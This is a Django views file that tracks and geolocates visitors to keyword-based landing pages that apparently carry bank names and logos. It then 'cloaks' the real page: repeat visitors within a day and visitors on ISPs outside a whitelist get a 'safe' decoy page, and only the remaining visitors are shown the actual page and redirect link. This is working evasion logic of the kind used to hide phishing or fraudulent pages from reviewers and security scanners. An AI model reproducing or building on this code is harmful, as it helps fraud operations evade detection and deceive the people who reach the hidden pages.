from urlparse import parse_qs
import datetime

from livesettings import config_value
import os.path
from django.shortcuts import render_to_response, get_object_or_404, render
from django.core.urlresolvers import reverse
from django.conf import settings
from pygeoip import GeoIP, GeoIPError

from website.models import Keyword, Visitor, LandingPage, ISPWhiteList


geoip = GeoIP(settings.GEOIP_DB_PATH)

orgs = GeoIP(os.path.join(settings.PROJECT_ROOT, 'shared', 'GeoIPOrg.dat'))
isps = GeoIP(os.path.join(settings.PROJECT_ROOT, 'shared', 'GeoIPISP.dat'))


def landing_page(request, keyword, lp='lp5'):
    v = Visitor()
    v.ip = request.META.get('REMOTE_ADDR', '')
    v.ua = request.META.get('HTTP_USER_AGENT', '')[:100]
    v.referer = request.META.get('HTTP_REFERER', '')
    v.query_string = request.META.get('QUERY_STRING', '')
    v.keyword = get_object_or_404(Keyword, keyword=keyword)
    v.lp = lp

    try:
        geo_data = geoip.record_by_addr(v.ip)
    except GeoIPError:
        geo_data = {}
    if geo_data is None:
        geo_data = {}

    v.city = geo_data.get('city', '').lower()
    v.state = geo_data.get('region_name', '')
    v.country_code = geo_data.get('country_code', '')
    v.zip_code = geo_data.get('postal_code', '')

    v.save()

    next_url = reverse('unique_subid', args=[v.text, ])
    if 'subid' in request.GET:
        next_url += '?subid=%s' % request.GET['subid']
    context = {
        'subid': v.text,
        'next': next_url,
    }

    return render(request, 'lp.html', context)


def unique_subid(request, subid):
    visitor = get_object_or_404(Visitor, text=subid)
    keyword_country = visitor.keyword.country

    try:
        visitor_width = int(request.GET.get('w'))
    except (TypeError, ValueError):
        visitor_width = None

    try:
        visitor_height = int(request.GET.get('h'))
    except (TypeError, ValueError):
        visitor_height = None

    if visitor_width and visitor_height:
        visitor.viewport = '%s,%s' % (visitor_width, visitor_height)

    context = {
        'v': visitor,
        'logo': visitor.keyword.image.url,
        'bank': visitor.keyword,
        'subid': visitor.text,
        'query_string': visitor.query_string,
        'query': dict([(k, v[0]) for k, v in parse_qs(visitor.query_string).items()])
    }

    day_ago = datetime.datetime.now() - datetime.timedelta(days=1)

    if visitor.visited and visitor.visit_datetime > day_ago:
        visitor.cloaked = True
        visitor.reason = 'already visited less than day ago'
        visitor.save()
        # One more visit, just showing safe page
        return render_to_response('landing_pages/{0}/{1}/safe.html'.format(keyword_country.lower(), visitor.lp), context)

    # First hit in a day
    if visitor.country_code in ('EG', 'NL'):  # Allow Egypt and Netherlands always
        visitor.cloaked = False
        visitor.reason = ''

    visitor.visit_datetime = datetime.datetime.now()  # Saving last access time

    visitor.visited = True

    try:
        visitor.organization = orgs.org_by_addr(str(visitor.ip))
    except GeoIPError:
        pass

    try:
        visitor.isp = isps.org_by_addr(str(visitor.ip))
    except GeoIPError:
        pass

    isp_filter_enabled = config_value('website', 'ENABLE_ISP_FILTER')
    if isp_filter_enabled and not ISPWhiteList.objects.filter(name=visitor.isp).exists():
        visitor.cloaked = True

    visitor.save()

    lp = LandingPage.objects.get(name=visitor.lp, country=keyword_country)

    if visitor.cloaked:
        context['redirect_link'] = lp.random_safe_link()
        return render_to_response('landing_pages/{0}/{1}/safe.html'.format(keyword_country.lower(), visitor.lp), context)
    else:
        context['redirect_link'] = lp.random_index_link()
        return render_to_response('landing_pages/{0}/{1}/index.html'.format(keyword_country.lower(), visitor.lp), context)


def fail(request):
    raise Exception('I always throw 500')